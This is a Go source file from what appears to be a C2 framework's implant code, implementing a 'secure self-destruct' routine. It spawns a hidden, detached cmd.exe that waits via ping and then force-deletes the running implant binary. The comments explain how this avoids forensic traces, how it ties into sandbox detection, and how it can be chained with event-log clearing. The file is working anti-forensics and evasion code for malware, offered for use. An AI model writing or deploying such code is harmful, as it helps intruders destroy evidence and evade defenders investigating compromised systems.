package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Secure self-destruct.
//
// SelfDestruct() removes the implant binary from disk and exits, in
// that order, without leaving a Watson/WER crash dump behind. It is
// designed to run from one of two trigger points:
//
//   1. Sandbox detection escalation (limits.ExecLimits → IsSandbox)
//   2. Operator-initiated kill with the SelfDestruct flag baked in
//      at build time (handlers.killHandler)
//
// On Windows the running EXE is locked for delete while the process
// owns the file handle, so we cannot rm-on-exit ourselves directly.
// The workaround used here is the classic detached-cmd technique:
// spawn `cmd.exe /c ping ... & del /f /q <path>` with no window and
// no parent linkage, then call os.Exit. The cmd waits a few seconds
// (long enough for our process to actually exit and release the file
// handle) and then deletes the file.
//
// This avoids:
//   - MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT — leaves a registry
//     entry that forensics scans for
//   - SetFileInformationByHandle (FileDispositionInfoEx) — works on
//     Windows 10 1709+ only; we want broader coverage
//   - Self-rename to %TEMP% — leaves the file on disk under a new name
//
// The cmd.exe spawn is itself a forensic artefact, but a short-lived
// one. If that's unacceptable for an engagement, the operator can
// chain SelfDestruct with a separate event-log clearing module
// (future M8 extension).

import (
	"os"
	"os/exec"
	"syscall"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// SelfDestruct schedules deletion of the running binary and then exits.
// It never returns. If the disk-deletion command fails (e.g. cmd.exe
// is missing, hooked, or the path resolves into a non-writable
// location), we still exit — the alternative is a hung implant.
func SelfDestruct() {
	path, err := os.Executable()
	if err == nil && path != "" {
		scheduleDelete(path)
	}
	// {{if .Config.Debug}}
	log.Printf("[selfdestruct] exiting after scheduling delete of %s (err=%v)", path, err)
	// {{end}}
	// os.Exit skips deferreds. That's deliberate — we don't want any
	// "graceful shutdown" hook flushing state to disk.
	os.Exit(0)
}

// scheduleDelete fires off a detached cmd.exe whose sole job is to wait
// long enough for us to exit and then `del` the file. We use ping as
// the sleep primitive because timeout.exe is blocked by some hardening
// baselines and Start-Sleep would require PowerShell.
func scheduleDelete(path string) {
	// 3x 1-second pings gives the parent ample time to exit and
	// release its handle on the executable.
	args := []string{
		"/c",
		"ping", "127.0.0.1", "-n", "3", ">", "nul",
		"&", "del", "/f", "/q", path,
	}
	cmd := exec.Command("cmd.exe", args...)

	// Detach: no window, no console, breakaway from the parent job.
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x00000008 | 0x00000200, // DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
	}

	if err := cmd.Start(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[selfdestruct] failed to spawn deleter: %v", err)
		// {{end}}
		return
	}
	// Don't Wait() — we want the cmd to outlive us.
	_ = cmd.Process.Release()
}
